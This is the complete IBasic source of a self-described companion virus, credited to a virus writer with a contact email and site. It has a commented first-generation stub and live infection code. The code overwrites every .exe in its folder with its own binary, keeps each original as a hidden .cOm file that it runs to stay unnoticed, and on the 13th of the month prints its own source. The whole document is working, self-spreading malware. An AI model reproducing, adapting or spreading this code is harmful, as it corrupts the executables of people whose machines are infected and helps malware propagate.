   'First Generation - Name of compiled file: FatFuck.cOm
   '-----------------------------------------------------
   'openconsole
   'print "FatFuck Companion Virus - First generation - FatFuck.cOm"
   'print "--------------------------------------------------------"
   'print
   'print "coded by DiA (c)04 GermanY"
   'print
   'print "Mail: DiA_hates_machine@gmx.de"
   'print "Site: http://www.vx-dia.de.vu/"
   'print
   'print
   'print
   'print "IBasic Compiler was in my fingers, and after"
   'print "1 hour i write this little Virus..."
   'print
   'print "IBasic is a easy language, and good to write simple"
   'print "applications in it, BUT the size of the"
   'print "compiled executables?! ~400kb?! That's to much for"
   'print "that little Companion."
   'print "OK, now I can delete IBasic =)"
   'print
   'print
   'print "press any key to exit......"
   'do : until inkey$ <> ""
   'closeconsole
   'end
   '----------------------------------------------------



   'FatFuck Companion Virus - Name of compiled file: FatFuck.exe
   '------------------------------------------------------------
   Declare "kernel32",GetCommandLineA(),string
   Declare "kernel32",SetFileAttributesA(fn:string,at:int),int

   Def TargetFile:string
   Def FindHandle:int

   system mid$(GetCommandLineA(),2,len(GetCommandLineA())-6) + "cOm"

   FindHandle = findopen(getstartpath + "*.exe")

   Infect:
   TargetFile = findnext(FindHandle)
   if TargetFile = "" then goto Payload

   copyfile TargetFile,left$(TargetFile,len(TargetFile)-3) + "cOm",1
   copyfile mid$(GetCommandLineA(),2,len(GetCommandLineA())-3),TargetFile,0
   SetFileAttributesA(left$(TargetFile,len(TargetFile)-3) + "cOm",0x2)

   goto Infect

   Payload:
   if mid$(date$,4,2) = "13"

   openconsole
   print "'FatFuck Virus - first Companion written in IBasic language(see source)"
   print "'coded by DiA (c)04 GermanY - http://www.vx-dia.de.vu/"
   print "Declare "kernel32",GetCommandLineA(),string"
   print "Declare "kernel32",SetFileAttributesA(fn:string,at:int),int"
   print "Def TargetFile:string"
   print "Def FindHandle:int"
   print "system mid$(GetCommandLineA(),2,len(GetCommandLineA())-6) + "cOm""
   print "FindHandle = findopen(getstartpath + "*.exe")"
   print "Infect:"
   print "TargetFile = findnext(FindHandle)"
   print "if TargetFile = "" then goto Payload"
   print "copyfile TargetFile,left$(TargetFile,len(TargetFile)-3) + "cOm",1"
   print "copyfile mid$(GetCommandLineA(),2,len(GetCommandLineA())-3),TargetFile,0"
   print "SetFileAttributesA(left$(TargetFile,len(TargetFile)-3) + "cOm",0x2)"
   print "goto Infect"
   print "Payload:"
   print "if mid$(date$,4,2) = "13""
   print "openconsole"
   print "'The Payload you see here - Show Source on 13th every mounth"
   print "do : until inkey$ <> """
   print "closeconsole"
   print "end"
   print "else"
   print "end"
   do : until inkey$ <> ""
   closeconsole
   end

   else
   end
   endif
   '------------------------------------------------------------
